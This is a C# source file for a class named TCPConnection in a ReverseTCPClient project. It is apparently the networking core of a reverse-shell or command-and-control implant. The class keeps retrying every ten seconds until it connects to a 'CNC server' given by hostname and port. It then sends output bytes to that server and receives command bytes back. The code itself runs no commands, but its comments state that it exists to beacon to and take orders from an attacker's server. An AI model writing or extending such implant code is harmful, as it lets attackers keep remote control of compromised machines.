using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ReverseTCPClient
{
    class TCPConnection
    {
        private Socket cncServer = new Socket(SocketType.Stream, ProtocolType.Tcp);
        
        /// <summary>
        /// Sets up a TCP connection to the CNC server using a domain name and port number.
        /// This will continue until a connection is made.
        /// </summary>
        /// <param name="hostName">Domain name of CNC server</param>
        /// <param name="hostPort">Port number of CNC server</param>
        public TCPConnection(string hostName, int hostPort)
        {
            bool connected = false;
            while (!connected)
            {
                try
                {
                    IPHostEntry cncAddress = Dns.GetHostEntry(hostName);
                    cncServer.Connect(cncAddress.AddressList, hostPort);
                    connected = true;
                }
                catch
                {
                    Thread.Sleep(10000);
                }
            }
        }

        /// <summary>
        /// Takes a byte[] object that has already been formatted for transport and sends it to the CNC server.
        /// </summary>
        /// <param name="output">Pre-formatted byte[] object.</param>
        /// <returns>Whether transmission was successful or not.</returns>
        public bool sendOutput(byte[] output)
        {
            try
            {
                cncServer.Send(output);
                return true;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Waits for data to be sent from CNC server and returns it in raw bytes.
        /// </summary>
        /// <returns>Bytes as they were sent.</returns>
        public byte[] receiveCommand()
        {
            byte[] bytes = new byte[512];
            cncServer.Receive(bytes);
            return bytes;
        }
    }
}
